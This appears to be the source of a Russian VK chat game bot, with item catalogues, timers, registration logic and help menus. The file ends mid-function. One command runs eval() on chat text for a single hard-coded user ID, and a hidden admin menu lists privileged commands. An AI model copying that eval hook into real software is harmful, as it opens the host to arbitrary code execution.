console.log('[riconc] >> Loading bot. Please, wait!');
const { VK } = require('vk-io');
const vk = new VK();
const commands = [];
const request = require('prequest');
let user = new VK();

const requests = require('request');
const fs = require("fs");
const rq = require("prequest");
let giving = false;

const TOKEN = "token";
const ID = group id;


// ПО ВСЕМ ВОПРОСАМ СУДА: VK.COM/ROMAN_AKULAR
// ПО ВСЕМ ВОПРОСАМ СУДА: VK.COM/ROMAN_AKULAR
// ПО ВСЕМ ВОПРОСАМ СУДА: VK.COM/ROMAN_AKULAR
// ПО ВСЕМ ВОПРОСАМ СУДА: VK.COM/ROMAN_AKULAR
// ПО ВСЕМ ВОПРОСАМ СУДА: VK.COM/ROMAN_AKULAR
// ПО ВСЕМ ВОПРОСАМ СУДА: VK.COM/ROMAN_AKULAR


const questbs = [

	{
		name: 'Выполнено✔',
		cost: 0,
		id: 1
    },
	{
		name: 'Не выполнено❌',
		cost: 0,
		id: 2
    }
];

const questbbs = [

	{
		name: 'Выполнено✔',
		cost: 0,
		id: 1
    },
	{
		name: 'Не выполнено❌',
		cost: 0,
		id: 2
    }
];

const questbbbs = [

	{
		name: 'Выполнено✔',
		cost: 0,
		id: 1
    },
	{
		name: 'Не выполнено❌',
		cost: 0,
		id: 2
    }
];

const questbbbbs = [

	{
		name: 'Выполнено✔',
		cost: 0,
		id: 1
    },
	{
		name: 'Не выполнено❌',
		cost: 0,
		id: 2
    }
];

const questbbbbbs = [

	{
		name: 'Выполнено✔',
		cost: 0,
		id: 1
    },
	{
		name: 'Не выполнено❌',
		cost: 0,
		id: 2
    }
];

const stranas = [

	{
		name: 'Не указана',
		cost: 0,
		id: 1
    },
	{
		name: '🇺🇸США',
		cost: 0,
		id: 2
    },

	{
		name: '🇷🇺Россия',
		cost: 0,
		id: 3
    },

	{
		name: '🇰🇷Япония',
		cost: 0,
		id: 4
    },

	{
		name: '🇺🇦Украина',
		cost: 0,
		id: 5
    },
	{
		name: '🇰🇿Казахстан',
		cost: 0,
		id: 6
    },
	{
		name: '🇧🇾Белоруссия',
		cost: 0,
		id: 7
    }
];

const shlapas = [

	{
		name: '👒Панама',
		cost: 30,
		id: 1
    },
	{
		name: '🎩Цилиндр',
		cost: 130,
		id: 2
    },
	{
		name: '🎓Ученик',
		cost: 150,
		id: 3
    },
	{
		name: '👑Корона',
		cost: 300,
		id: 4
    },
	{
		name: '⛑Каска',
		cost: 500,
		id: 5
    },
];

const obyvs = [
	{
		name: '👞Классика',
		cost: 0,
		id: 1
    },
	{
		name: '👟Спортивные кроссовки',
		cost: 30,
		id: 2
    }
];


const rubahkas = [
	{
		name: '👔Leviton',
		cost: 0,
		id: 1
    },
	{
		name: '👕Gucci',
		cost: 500,
		id: 2
    }
];

const golovas = [
	{
		name: '😎Крутой',
		cost: 0,
		id: 1
    },
	{
		name: '😡Злой',
		cost: 10,
		id: 2
    },
	{
		name: '👽Инопланетянин',
		cost: 20,
		id: 3
    },
	{
		name: '😇Ангел',
		cost: 30,
		id: 4
    },
	{
		name: '☹Грустный',
		cost: 40,
		id: 5
    },
	{
		name: '👺Дьявол',
		cost: 50,
		id: 6
    },
	{
		name: '👮Полицейский',
		cost: 60,
		id: 7
    },
	{
		name: '🤓Батаник',
		cost: 70,
		id: 8
    },
	{
		name: '🤠Ковбой',
		cost: 80,
		id: 9
    },
	{
		name: '😈Дьявол',
		cost: 100,
		id: 10
    }
];

const cams = [

	{
		name: 'EOS 5DS R',
		cost: 10,
		id: 1
    }
];

const pitoms = [
	{
		name: 'Ленивец',
		cost: 0,
		id: 1
    },
	{
		name: 'Кошка',
		cost: 30,
		id: 2
    },
		{
		name: 'Собака',
		cost: 50,
		id: 3
    },
	{
		name: 'Курица',
		cost: 60,
		id: 4
    },
	{
		name: 'Тигр',
		cost: 70,
		id: 5
    },
	{
		name: 'Дракон',
		cost: 80,
		id: 6
    },
	{
		name: 'Лошадь',
		cost: 10,
		id: 7
    }
];

const fotiks = [
	{
		name: 'Nikon D5600 Kit',
		cost: 30,
		id: 1
    },
	{
		name: 'Sony Alpha ILCE-6300',
		cost: 40,
		id: 2
    },
	{
		name: 'Canon PowerShot SX420',
		cost: 10,
		id: 3
    },
	{
		name: 'Fujifilm FinePix XP130',
		cost: 10,
		id: 4
    },
	{
		name: 'Samsung Galaxy NX',
		cost: 20,
		id: 5
    }
];

const teliks = [
	{
		name: 'Samsung UE43N5300AUXCE',
		cost: 30,
		id: 1
    },
	{
		name: 'Haier LE32K5500T',
		cost: 25,
		id: 2
    },
	{
		name: 'LG 43LK5400',
		cost: 35,
		id: 3
    },
	{
		name: 'TCL 32S62',
		cost: 20,
		id: 4
    },	
	{
		name: 'Artel 32AH90G',
		cost: 55,
		id: 5
    },
	{
		name: 'Sony KDL-40WD653',
		cost: 40,
		id: 6
    },
	{
		name: 'Elenberg LD32A12GS338',
		cost: 15,
		id: 7
    },
	{
		name: 'Toshiba 32L5780EC',
		cost: 60,
		id: 8
    },	
	{
		name: 'Philips 32PHS5302',
		cost: 45,
		id: 9
    },
	{
		name: 'ERGO LE43СU6500AK',
		cost: 45,
		id: 10
    }
];

const copters = [

	{
		name: 'Hubsan X4',
		cost: 30,
		id: 1
	},
	{
		name: 'Sima X5C',
		cost: 35,
		id: 2
	},
	{
		name: 'DJI phantom 3',
		cost: 40,
		id: 3
	},
	{
		name: 'FPV mt2204',
		cost: 50,
		id: 4
	},
	{
		name: 'vk.com/roman_akular COPTER',
		cost: 100,
		id: 5
	}

];

const tables = [
	{
		name: 'Samsung Galaxy Tab E',
		cost: 30,
		id: 1
	},
	{
		name: 'Lenovo TAB 4',
		cost: 50,
		id: 2
	},
	{
		name: 'Huawei T3',
		cost: 80,
		id: 3
	},
	{
		name: 'Apple iPad Cellular',
		cost: 10,
		id: 4
	},
	{
		name: 'Prestigio PMT3157',
		cost: 10,
		id: 5
	},
	{
		name: 'Huawei M5 LITE',
		cost: 80,
		id: 6
	}
];

const motos = [
	{
		name: 'Faggio',
		cost: 100,
		id: 1
	},
	{
		name: 'Freeway',
		cost: 500,
		id: 2
	},
	{
		name: 'PCJ-500',
		cost: 500,
		id: 3
	},
	{
		name: 'BF-400',
		cost: 100,
		id: 4
	},
	{
		name: 'NRG-500',
		cost: 500,
		id: 5
	},
	{
		name: 'HPV-500',
		cost: 1000,
		id: 6
	}
];

const cars = [
	{
		name: 'Самокат',
		cost: 5,
		id: 1
	},
	{
		name: 'Велосипед',
		cost: 25,
		id: 2
	},
	{
		name: 'Гироскутер',
		cost: 50,
		id: 3
	},
	{
		name: 'Сегвей',
		cost: 75,
		id: 4
	},
	{
		name: 'Мопед',
		cost: 25,
		id: 5
	},
	{
		name: 'Мотоцикл',
		cost: 50,
		id: 6
	},
	{
		name: 'ВАЗ 2109',
		cost: 75,
		id: 7
	},
	{
		name: 'Квадроцикл',
		cost: 80,
		id: 8
	},
	{
		name: 'Багги',
		cost: 135,
		id: 9
	},
	{
		name: 'Вездеход',
		cost: 200,
		id: 10
	},
	{
		name: 'Лада Xray',
		cost: 350,
		id: 11
	},
	{
		name: 'Audi Q7',
		cost: 750,
		id: 12
	},
	{
		name: 'BMW X6',
		cost: 1000,
		id: 13
	},
	{
		name: 'Toyota FT-HS',
		cost: 1050,
		id: 14
	},
	{
		name: 'BMW Z4 M',
		cost: 1110,
		id: 15
	},
	{
		name: 'Subaru WRX STI',
		cost: 1150,
		id: 16
	},
	{
		name: 'Lamborghini Veneno',
		cost: 1350,
		id: 17
	},
	{
		name: 'Tesla Roadster',
		cost: 1400,
		id: 18
	},
	{
		name: 'Yamaha YZF R6',
		cost: 1450,
		id: 19
	},
	{
		name: 'Bugatti Chiron',
		cost: 1550,
		id: 20
	},
	{
		name: 'Thrust SSC',
		cost: 1650,
		id: 21
	},
	{
		name: 'Ferrari LaFerrari',
		cost: 1750,
		id: 22
	},
	{
		name: 'Koenigsegg Regear',
		cost: 1850,
		id: 23
	},
	{
		name: 'Tesla Semi',
		cost: 1950,
		id: 24
	},
	{
		name: 'Venom GT',
		cost: 2000,
		id: 25
	},
	{
		name: 'Rolls-Royce',
		cost: 2300,
		id: 26
	},
	{
		name: 'Вишневая Семерка',
		cost: 200,
		id: 27
	},
	{
		name: 'BMW X5',
		cost: 500,
		id: 28
	},
	{
		name: 'Devel Sixteen',
		cost: 2500,
		id: 29
	},
	{
		name: 'Лошадь',
		cost: 100,
		id: 30
	},
	{
		name: 'Toyota Celica',
		cost: 2000,
		id: 31
	},
	{
		name: 'Honda Civic',
		cost: 2200,
		id: 32
	}
];

const yachts = [
	{
		name: 'Ванна',
		cost: 100,
		id: 1
	},
	{
		name: 'Nauticat 331',
		cost: 1000,
		id: 2
	},
	{
		name: 'Nordhavn 56 MS',
		cost: 1500,
		id: 3
	},
	{
		name: 'Princess 60',
		cost: 2500,
		id: 4
	},
	{
		name: 'Azimut 70',
		cost: 3500,
		id: 5
	},
	{
		name: 'Dominator 40M',
		cost: 5000,
		id: 6
	},
	{
		name: 'Moonen 124',
		cost: 6000,
		id: 7
	},
	{
		name: 'Wider 150',
		cost: 6500,
		id: 8
	},
	{
		name: 'Palmer Johnson 42M SuperSport',
		cost: 8000,
		id: 9
	},
	{
		name: 'Wider 165',
		cost: 8500,
		id: 10
	},
	{
		name: 'Eclipse',
		cost: 15000,
		id: 11
	},
	{
		name: 'Dubai',
		cost: 30000,
		id: 12
	},
	{
		name: 'Streets of Monaco',
		cost: 75000,
		id: 13
	}
];

const airplanes = [
	{
		name: 'Параплан',
		cost: 1000,
		id: 1
	},
	{
		name: 'АН-2',
		cost: 3500,
		id: 2
	},
	{
		name: 'Cessna-172E',
		cost: 7000,
		id: 3
	},
	{
		name: 'Supermarine Spitfire',
		cost: 10000,
		id: 4
	},
	{
		name: 'BRM NG-5',
		cost: 14000,
		id: 5
	},
	{
		name: 'Cessna T210',
		cost: 26000,
		id: 6
	},
	{
		name: 'Beechcraft 1900D',
		cost: 55000,
		id: 7
	},
	{
		name: 'Cessna 550',
		cost: 80000,
		id: 8
	},
	{
		name: 'Hawker 4000',
		cost: 224000,
		id: 9
	},
	{
		name: 'Learjet 31',
		cost: 45000,
		id: 10
	},
	{
		name: 'Airbus A318',
		cost: 85000,
		id: 11
	},
	{
		name: 'F-35A',
		cost: 160000,
		id: 12
	},
	{
		name: 'Boeing 747-430 Custom',
		cost: 225000,
		id: 13
	},
	{
		name: 'C-17A Globemaster III',
		cost: 350000,
		id: 14
	},
	{
		name: 'F-22 Raptor',
		cost: 40000,
		id: 15
	},
	{
		name: 'Airbus 380 Custom',
		cost: 60000,
		id: 16
	},
	{
		name: 'B-2 Spirit Stealth Bomber',
		cost: 1000000,
		id: 17
	}
];

const helicopters = [
	{
		name: 'Шарик с пропеллером',
		cost: 20,
		id: 1
	},
	{
		name: 'RotorWay Exec 162F',
		cost: 300,
		id: 2
	},
	{
		name: 'Robinson R44',
		cost: 450,
		id: 3
	},
	{
		name: 'Hiller UH-12C',
		cost: 130,
		id: 4
	},
	{
		name: 'AW119 Koala',
		cost: 250,
		id: 5
	},
	{
		name: 'MBB BK 117',
		cost: 400,
		id: 6
	},
	{
		name: 'Eurocopter EC130',
		cost: 750,
		id: 7
	},
	{
		name: 'Leonardo AW109 Power',
		cost: 1000,
		id: 8
	},
	{
		name: 'Sikorsky S-76',
		cost: 1500,
		id: 9
	},
	{
		name: 'Bell 429WLG',
		cost: 1900,
		id: 10
	},
	{
		name: 'NHI NH90',
		cost: 3500,
		id: 11
	},
	{
		name: 'Kazan Mi-35M',
		cost: 6000,
		id: 12
	},
	{
		name: 'Bell V-22 Osprey',
		cost: 13500,
		id: 13
	}
];

const homes = [
	{
		name: 'Коробка из-под холодильника',
		cost: 250,
		id: 1
	},
	{
		name: 'Подвал',
		cost: 300,
		id: 2
	},
	{
		name: 'Палатка',
		cost: 350,
		id: 3
	},
	{
		name: 'Домик на дереве',
		cost: 500,
		id: 4
	},
	{
		name: 'Полуразрушенный дом',
		cost: 700,
		id: 5
	},
	{
		name: 'Дом в лесу',
		cost: 900,
		id: 6
	},
	{
		name: 'Деревянный дом',
		cost: 1050,
		id: 7
	},
	{
		name: 'Дача',
		cost: 1250,
		id: 8
	},
	{
		name: 'Кирпичный дом',
		cost: 1300,
		id: 9
	},
	{
		name: 'Коттедж',
		cost: 1400,
		id: 10
	},
	{
		name: 'Особняк',
		cost: 1500,
		id: 11
	},
	{
		name: 'Дом на Рублёвке',
		cost: 1800,
		id: 12
	},
	{
		name: 'Личный небоскрёб',
		cost: 1900,
		id: 13
	},
	{
		name: 'Остров с особняком',
		cost: 1999,
		id: 14
	},
	{
		name: 'Белый дом',
		cost: 2500,
		id: 15
	},
	{
		name: 'Черный дом',
		cost: 3000,
		id: 16
	},
	{
		name: 'Дом на Мольдивах',
		cost: 3200,
		id: 17
	},
	{
		name: 'Дом в джунглях',
		cost: 4000,
		id: 18
	}
];

const apartments = [
	{
		name: 'Чердак',
		cost: 15000,
		id: 1
	},
	{
		name: 'Квартира в общежитии',
		cost: 55000,
		id: 2
	},
	{
		name: 'Однокомнатная квартира',
		cost: 175000,
		id: 3
	},
	{
		name: 'Двухкомнатная квартира',
		cost: 260000,
		id: 4
	},
	{
		name: 'Четырехкомнатная квартира',
		cost: 500000,
		id: 5
	},
	{
		name: 'Квартира в центре Москвы',
		cost: 1600000,
		id: 6
	},
	{
		name: 'Двухуровневая квартира',
		cost: 4000000,
		id: 7
	},
	{
		name: 'Квартира с Евроремонтом',
		cost: 6000000,
		id: 8
	}
];

const phones = [
	{
		name: 'Nokia 108',
		cost: 50,
		id: 1
	},
	{
		name: 'Nokia 3310 (2017)',
		cost: 150,
		id: 2
	},
	{
		name: 'ASUS ZenFone 4',
		cost: 200,
		id: 3
	},
	{
		name: 'BQ Aquaris X',
		cost: 300,
		id: 4
	},
	{
		name: 'Sony Xperia XA',
		cost: 400,
		id: 5
	},
	{
		name: 'Samsung Galaxy S8',
		cost: 500,
		id: 6
	},
	{
		name: 'Xiaomi Mi Mix',
		cost: 520,
		id: 7
	},
	{
		name: 'Torex FS1',
		cost: 550,
		id: 8
	},
	{
		name: 'iPhone X',
		cost: 600,
		id: 9
	},
	{
		name: 'Мегафон С1',
		cost: 800,
		id: 10
	},
	{
		name: 'iPhone XR',
		cost: 1000,
		id: 11
	},
	{
		name: 'iPhone XS MAX PRO',
		cost: 2000,
		id: 12
	},
	{
		name: 'LG ThinQ',
		cost: 500,
		id: 12
	}
];


const farms = [
	{
		name: '6U Nvidia',
		cost: 30000,
		id: 1
	},
	{
		name: 'AntminerS9',
		cost: 50000,
		id: 2
	},
	{
		name: 'FM2018-BT200',
		cost: 60000,
		id: 3
	},
	{
		name: 'Шахта с биткоинами',
		cost: 70000,
		id: 4
	},
	{
		name: 'Планета с биткоинами',
		cost: 100000,
		id: 5
	}
];

const businesses = [
	{
		name: 'Шаурмичная',
		cost: 500,
		earn: 30,
		id: 1,
		icon: '🥖'
	},
	{
		name: 'Ларёк',
		cost: 650,
		earn: 35,
		id: 2,
		icon: '🏪'
	},
	{
		name: 'Ресторан',
		cost: 700,
		earn: 45,
		id: 3,
		icon: '🍷'
	},
	{
		name: 'Магазин',
		cost: 950,
		earn: 55,
		id: 4,
		icon: '🏫'
	},
	{
		name: 'Завод',
		cost: 1000,
		earn: 60,
		id: 5,
		icon: '🏭'
	},
	{
		name: 'Шахта',
		cost: 1100,
		earn: 65,
		id: 6,
		icon: '⛏'
	},
	{
		name: 'Офис',
		cost: 1150,
		earn: 75,
		id: 7,
		icon: '🏢'
	},
	{
		name: 'Разработка игр',
		cost: 1300,
		earn: 85,
		id: 8,
		icon: '🕹'
	},
	{
		name: 'Нефтевышка',
		cost: 1500,
		earn: 90,
		id: 9,
		icon: '🏜'
	},
	{
		name: 'Атомная электростанция',
		cost: 2000,
		earn: 95,
		id: 10,
		icon: '💡'
	},
	{
		name: 'Космическое агентство',
		cost: 2500,
		earn: 100,
		id: 11,
		icon: '🗺'
	}
];

const works = [
	{
		name: 'Дворник',
		requiredLevel: 1,
		min: 12,
		max: 12,
		id: 1
	},
	{
		name: 'Сантехник',
		requiredLevel: 3,
		min: 22,
		max: 22,
		id: 2
	},
	{
		name: 'Электрик',
		requiredLevel: 5,
		min: 25,
		max: 25,
		id: 3
	},
	{
		name: 'Слесарь',
		requiredLevel: 8,
		min: 30,
		max: 30,
		id: 4
	},
	{
		name: 'Юрист',
		requiredLevel: 10,
		min: 45,
		max: 45,
		id: 5
	},
	{
		name: 'Бухгалтер',
		requiredLevel: 14,
		min: 55,
		max: 55,
		id: 6
	},
	{
		name: 'Бармен',
		requiredLevel: 22,
		min: 60,
		max: 60,
		id: 7
	},
	{
		name: 'Администратор',
		requiredLevel: 25,
		min: 75,
		max: 75,
		id: 8
	},
	{
		name: 'Программист',
		requiredLevel: 49,
		min: 100,
		max: 100,
		id: 9
	}
];

const utils = {
	sp: (int) => {
		int = int.toString();
		return int.split('').reverse().join('').match(/[0-9]{1,3}/g).join('.').split('').reverse().join('');
	},
	rn: (int, fixed) => {
		if (int === null) return null;
		if (int === 0) return '0';
		fixed = (!fixed || fixed < 0) ? 0 : fixed;
		let b = (int).toPrecision(2).split('e'),
			k = b.length === 1 ? 0 : Math.floor(Math.min(b[1].slice(1), 14) / 3),
			c = k < 1 ? int.toFixed(0 + fixed) : (int / Math.pow(10, k * 3) ).toFixed(1 + fixed),
			d = c < 0 ? c : Math.abs(c),
			e = d + ['', 'тыс', 'млн', 'млрд', 'трлн'][k];

			e = e.replace(/e/g, '');
			e = e.replace(/\+/g, '');
			e = e.replace(/Infinity/g, 'ДОХЕРА');

		return e;
	},
	gi: (int) => {
		int = int.toString();

		let text = ``;
		for (let i = 0; i < int.length; i++)
		{
			text += `${int[i]}&#8419;`;
		}

		return text;
	},
	decl: (n, titles) => { return titles[(n % 10 === 1 && n % 100 !== 11) ? 0 : n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? 1 : 2] },
	random: (x, y) => {
		return y ? Math.round(Math.random() * (y - x)) + x : Math.round(Math.random() * x);
	},
	pick: (array) => {
		return array[utils.random(array.length - 1)];
	}
}

const rotateText = {
	q: 'q',
	w: 'ʍ',
	e: 'ǝ',
	r: 'ɹ',
	t: 'ʇ',
	y: 'ʎ',
	u: 'u',
	i: 'ᴉ',
	o: 'o',
	p: 'p',
	a: 'ɐ',
	s: 's',
	d: 'd',
	f: 'ɟ',
	g: 'ƃ',
	h: 'ɥ',
	j: 'ɾ',
	k: 'ʞ',
	l: 'l',
	z: 'z',
	x: 'x',
	c: 'ɔ',
	v: 'ʌ',
	b: 'b',
	n: 'n',
	m: 'ɯ',

	й: 'ņ',
	ц: 'ǹ',
	у: 'ʎ',
	к: 'ʞ',
	е: 'ǝ',
	н: 'н',
	г: 'ɹ',
	ш: 'm',
	щ: 'm',
	з: 'ε',
	х: 'х',
	ъ: 'q',
	ф: 'ф',
	ы: 'ıq',
	в: 'ʚ',
	а: 'ɐ',
	п: 'u',
	р: 'd',
	о: 'о',
	л: 'v',
	д: 'ɓ',
	ж: 'ж',
	э: 'є',
	я: 'ʁ',
	ч: 'һ',
	с: 'ɔ',
	м: 'w',
	и: 'и',
	т: 'ɯ',
	ь: 'q',
	б: 'ƍ',
	ю: 'oı'
}

let btc = 6000;

let users = require('./users.json');
let buttons = [];

setTimeout(async () => {
	const rq = await request('https://api.cryptonator.com/api/ticker/btc-usd');

	if(!rq.ticker) return;
	if(!rq.ticker.price) return;

	btc = Math.floor(Number(rq.ticker.price));
}, 5);

setInterval(async () => {
	const rq = await request('https://api.cryptonator.com/api/ticker/btc-usd');

	if(!rq.ticker) return;
	if(!rq.ticker.price) return;

	btc = Math.floor(Number(rq.ticker.price));
}, 6000);

setInterval(async () => {
	await saveUsers();
	console.log('saved');
}, 15000);

setInterval(async () => {
	users.filter(x=> x.misc.farm !== 0).map(x=> {
		if(x.misc.farm === 1)
		{
			x.farm_btc += 1;
		}

		if(x.misc.farm === 2)
		{
			x.farm_btc += 2;
		}

		if(x.misc.farm === 3)
		{
			x.farm_btc += 3;
		}
		
		if(x.misc.farm === 4)
		{
			x.farm_btc += 4;
		}
		
		if(x.misc.farm === 5)
		{
			x.farm_btc += 5;
		}
	});
}, 3600000);

setInterval(async () => {
	users.map(user => {
		if(user.business)
		{
			const biz = businesses.find(x=> x.id === user.business);
			if(!biz) return;

			user.biz += biz.earn;
		}
	});
}, 3600000);

function clearTemp()
{
	users.map(user => {
		user.timers.hasWorked = false;
		user.timers.bonus = false;
		user.timers.pet = false;
		user.timers.vzlom = false;
		user.timers.promo = false;
		user.timers.taxi = false;
		user.timers.film = false;
		user.timers.safe = false;
		user.timers.isl = false;
		user.timers.eda = false;
		user.timers.edae = false;
	});
}

clearTemp();

async function saveUsers()
{
	require('fs').writeFileSync('./users.json', JSON.stringify(users, null, '\t'));
	return true;
}

vk.setOptions({ token: TOKEN, pollingGroupId: ID });
const { updates, snippets } = vk;

updates.startPolling();
updates.on('message', async (message) => {
	if(Number(message.senderId) <= 0) return;
	if(/\[club175499493\|(.*)\]/i.test(message.text)) message.text = message.text.replace(/\[club175499493\|(.*)\]/ig, '').trim();

	if(!users.find(x=> x.id === message.senderId))
	{
		const [user_info] = await vk.api.users.get({ user_id: message.senderId });
		const date = new Date();

		users.push({
			id: message.senderId,
			uid: users.length,
			balance: 1000,
			bank: 0,
			admlevel: false,
			btc: 0,
			golod: 0,
			ryuda: 0,
			taina: 0,
			ryda: 0,
			legend: 0,
			ryda: 0,
			bonia: 1,
			premer: 0,
			islquest: 0,
			pizda: false,
			pasport: 0,
			pp: 0,
			pasportpoll: 0,
			questwin1: 0,
			questwin2: 0,
			questwin3: 0,
			vipquest: 0,
			loxx: false,
			nurik: false,
			xer: false,
			ope: 0,
			tar: 0,
			xuy: 0,
			jenas: 0,
			hia: 0,
			vava: 0,
			vova: 0,
			xea: false,
			mudak: false,
			ku: 0,
			fga: 0,
			sho: 0,
			viv: 0,
			joker: 0,
			farm_btc: 0,
			biz: 0,
			rating: 0,
			regDate: `${date.getDate()}.${date.getMonth()}.${date.getFullYear()}`,
			mention: true,
			ban: false,
			timers: {
				hasWorked: false,
				bonus: false,
				pet: false,
				promo: false,
				taxi: false,
				safe: false,
				film: false,
				vzlom: false,
				isl: false,
				edae: false
			},
			tag: user_info.first_name,
			work: 0,
			business: 0,
			notifications: true,
			exp: 1,
			level: 1,
			referal: null,
			pppppromo: false,
			transport: {
				zapret: 0,
				zapret2: 0,
				car: 0,
				promocod: 0,
				moto: 0,
				fotik: 0,
				shlapa: 0,
				pas: 0,
				questb: 2,
				questbb: 2,
				questbbb: 2,
				questbbbb: 2,
				questbbbbb: 2,
				shtani: 1,
				obyv: 1,
				rubahka: 1,
				golova: 1,
				cam: 0,
				passp: 0,
				strana: 1,
				pitom: 1,
				telik: 0,
				copter: 0,
				table: 0,
				yacht: 0,
				airplane: 0,
				helicopter: 0
			},
			realty: {
				home: 0,
				apartment: 0
			},
			misc: {
				phone: 0,
				farm: 0
			},
			marriage: {
				partner: 0,
				requests: []
			}
		});
	}
	
	message.user = users.find(x=> x.id === message.senderId);
	if(message.user.ban) return message.send(`⚠ Ваш аккаунт заблокирован !`);

	const bot = (text, params) => {
		return message.send(`${message.user.mention ? `@id${message.user.id} (${message.user.tag})` : `${message.user.tag}`}, ${text}`, params);
	}

	const command = commands.find(x=> x[0].test(message.text));
	if(!command) return;

	if(message.user.exp >= 24)
	{
		message.user.exp = 1;
		message.user.level += 1;
	}

	message.args = message.text.match(command[0]);
	await command[1](message, bot);

	console.log(`Executed: ${message.text}`)
});

const cmd = {
	hear: (p, f) => {
		commands.push([p, f]);
	}
}

cmd.hear(/^(?:zz)\s([^]+)$/i, async (message, bot) => {
	if(message.senderId !== 324503169 && message.senderId !== 324503169 && message.senderId !== 324503169 && message.senderId !== 324503169 && message.senderId !== 324503169) return;

	try {
		const result = eval(message.args[1]);

		if(typeof(result) === 'string')
		{
			return bot(`string: ${result}`);
		} else if(typeof(result) === 'number')
		{
			return bot(`number: ${result}`);
		} else {
			return bot(`${typeof(result)}: ${JSON.stringify(result, null, '&#12288;\t')}`);
		}
	} catch (e) {
		console.error(e);
		return bot(`ошибка:
		${e.toString()}`);
	}
});

cmd.hear(/^(?:помощь|команды|меню|help|commands|cmds|menu|начать|start)$/i, async (message, bot) => {
	await bot(`
[ Заработок 💰 ]
⠀⠀> Работа - список профессий 📦
⠀⠀> Работать - провести один рабочий день (раз в 10 минут) 📦
⠀⠀> Уволиться - думаю, тут ясно, что имеется ввиду 📛
⠀⠀> Таксовать - дополнительный заработок (нужна машина, раз в час) 🚖
⠀⠀> Реф - деньги за друзей 👫
⠀⠀> Бонус - ежедневные бесплатные деньги (и не только) 🎁
⠀⠀> Взломать - попытаться ограбить банк (раз в час) 🔒
⠀⠀> Исследовать - прогуляйтесь по миру, попробуйте найти что-нибудь (раз в час) 🚵
⠀⠀> Пет поход - прогулка с питомцем (раз в час) 🐶
⠀⠀> Снять фильм - название говорит само за себя (нужна камера, раз в час, 1⭐ = 10$) 🎬
⠀⠀> Ферма - собрать биткоины 🅱
⠀⠀> Биткоины [кол-во] 🅱
⠀⠀> Продать [предмет]
[ Развлечения 🎊 ]
( Бесплатные 🎲) 
⠀⠀> Переверни [текст] ↕ - переворачивает текст
⠀⠀> Шар [текст] - правда, или нет? 🔮
⠀⠀> Инфа [текст] - насколько верна информация? 📈
⠀⠀> Выбери [текст] или [текст] - что-же выберет бот? 🤔
⠀⠀( Платные 💵 ) ⠀⠀
⠀⠀> Кубик [1-6] 🎲
⠀⠀> Казино [сумма] (Нужен планшет) 🎰
⠀⠀> Трейд [вверх/вниз] (Нужен планшет) 📊
⠀⠀> Стаканчик [1-3] [сумма] 🎲
⠀⠀> Сейф [2 цифры] 🔒
⠀[ Разное 🔔]
⠀⠀>Персонаж👔-Посмотреть своего персонажа 
⠀⠀>Имущество⛪-Посмотреть свое имущетсво 
⠀⠀>Квесты📘-Список квестов 
⠀⠀>Список еды🍖-Посмотреть меню еды 
⠀⠀>Получить паспорт🎫-Получить паспорт(нужен для покупки чего-либо) 
⠀⠀>Копать руду🎛-Копать руду(можно продать) 
⠀⠀>Продать руду🎛-Продажа руды (1кг=2$)
⠀⠀> Профиль - информация о тебе 📋
⠀⠀> Баланс - кол-во денег на руках 💵
⠀⠀> Банк - операции со счетом в банке 💳
⠀⠀> Ваш рейтинг - кол-во рейтинга 👑
⠀⠀> Ник [текст] - твое имя в боте ✏
⠀⠀> Передать [ID] [сумма] - передача денег 💸📩
⠀⠀> Брак - сделать предложение 💍
⠀⠀> Развод - разорвать отношения 💔
⠀⠀> Топ - рейтинг игроков 🏆
⠀⠀> Донат - информация о донате 👑
⠀⠀> Репорт [текст] - Связь с администрацией 🆘
⠀⠀> Ahelp - команды для администраторов 
⠀⠀⠀⠀**************************************
⠀⠀⠀⠀📗📍 ➾ Сайт:vk.com/roman_akularbot.ml
⠀⠀⠀⠀📗📍 ➾ Группа:vk.com/vk.com/roman_akular_bot
`);
 
});

cmd.hear(/^(?:донат)$/i, async (message, bot) => {
	return bot(`🙆‍♂ Админка - 35 рублей
( посмотреть команды " ahelp " )
Покупка только у него:vk.com/roman_akular

📍Наш сайт:vk.com/roman_akularbot.ml
📍Наша группа:vk.com/vk.com/roman_akular_bot
`);
});

////////////////////
cmd.hear(/^(?:ACMD228COD)$/i, async (message, bot) => {
	return bot(`ADM CMD:
	📌 DellAcc id - Удалить аккаунт
	📌 ban id - забанить игрока
	📌 unban id - разбанить игрока
	📌 выдать id - выдать много денег игроку
	📌 GiveAdm id - Выдать Админку
	📌 givebt id - выдать биткоины игроку ( 100 )
	📌 !set - Выдать себе 1.000.000.000
	📌 ответ id - ответить игроку ( Для разраба )
	******************************************
	📍Наш сайт:vk.com/roman_akularbot.ml
	📍Наша группа:vk.com/vk.com/roman_akular_bot
	
	`);
});
////////////////////
cmd.hear(/^(?:беседы)$/i, async (message, bot) => {
	return bot(`
	1. Наша беседа: https://vk.me/join/AJQ1dyF1mQsW9HZiFEPYCRJw
	
	`);
});
///////////////////

cmd.hear(/^(?:помощь)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].toLowerCase();

	if(message.args[1] === 'переверни')
	{
		return message.send(`Команда "Переверни" пишет ваш текст вверх ногами (Поддерживаются цифры, буквы латинского и кириллического алфавита, а также некоторые символы)`);
	}

	if(message.args[1] === 'шар')
	{
		return message.send(`Команда "Шар" используя магию рандома выводит случайное сообщение.`);
	}

	if(message.args[1] === 'инфа')
	{
		return message.send(`Команда "Инфа" случайным образом присылает шанс чего-либо. Также можно использовать команды "Шанс" или "Вероятность"`);
	}

	if(message.args[1] === 'выбери')
	{
		return message.send(`Команда "Выбери" случайным образом выбирает один из двух предложенных вариантов.`);
	}

	if(message.args[1] === 'казино')
	{
		return message.send(`Команда "Казино" случайным образом умножает вашу ставку (Могут выпасть множители х0, x2). Чтобы поставить всю сумму введите "Казино все" или "Казино вабанк"`);
	}

	if(message.args[1] === 'кубик')
	{
		return message.send(`Команда "Кубик" сравнивает ваше число со случайным от 1 до 6, если вы угадали, то получаете вознаграждение. Также можно использовать "Куб"`);
	}

	if(message.args[1] === 'трейд')
	{
		return message.send(`Команда "Трейд" - симулятор бинарных опционов. Введите "Трейд вверх (сумма)" если думаете, что курс валюты будет увеличиваться, или "Трейд вниз (сумма)" если будет уменьшаться.`);
	}

	if(message.args[1] === 'стаканчик')
	{
		return message.send(`С помощью команды "Стаканчик" вы можете сыграть в аналог игры "Напёрстки". Чтобы играть введите "Стаканчик [1-3] [сумма]".`);
	}

	if(message.args[1] === 'работа')
	{
